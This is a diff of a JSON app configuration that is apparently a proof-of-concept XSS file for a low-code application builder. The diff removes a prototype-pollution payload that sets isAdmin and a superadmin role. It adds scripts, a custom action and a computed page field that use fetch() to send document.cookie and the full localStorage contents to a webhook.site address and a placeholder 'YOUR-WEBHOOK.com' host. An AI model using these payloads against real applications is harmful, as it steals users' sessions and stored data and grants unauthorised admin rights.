@@ -1,11 +1,43 @@
 {
-  "__proto__": {
-    "isAdmin": true,
-    "role": "superadmin"
+  "app": { "id": "poc", "name": "Test" },
+  "global": {
+    "data_sources": {
+      "ds_test": {
+        "type": "static",
+        "config": { "data": [{ "value": 1 }] },
+        "triggerOnLoad": true
+      }
+    },
+    "scripts": {
+      "poc": "function poc() { fetch('https://webhook.site/71cac033-2499-404d-88dc-cd5014af3d63/?c='+document.cookie); }"
+    },
+    "actions": {
+      "act_poc": {
+        "type": "custom_script",
+        "config": {
+          "code": "fetch('https://webhook.site/71cac033-2499-404d-88dc-cd5014af3d63/?exfil='+encodeURIComponent(JSON.stringify(localStorage))); fetch('https://YOUR-WEBHOOK.com/?cookie='+encodeURIComponent(document.cookie));"
+        }
+      }
+    }
   },
-  "constructor": {
-    "prototype": {
-      "isAdmin": true
+  "pages": {
+    "page_test": {
+      "name": "Test",
+      "route": "/",
+      "isDefault": true,
+      "root": {
+        "type": "Container",
+        "props": {},
+        "children": [{
+          "type": "Typography",
+          "props": { "children": "XSS Test" },
+          "computed": {
+            "children": {
+              "code": "(function(){fetch('https://webhook.site/71cac033-2499-404d-88dc-cd5014af3d63/?data='+document.cookie)})(); 'XSS'"
+            }
+          }
+        }]
+      }
     }
   }
 }
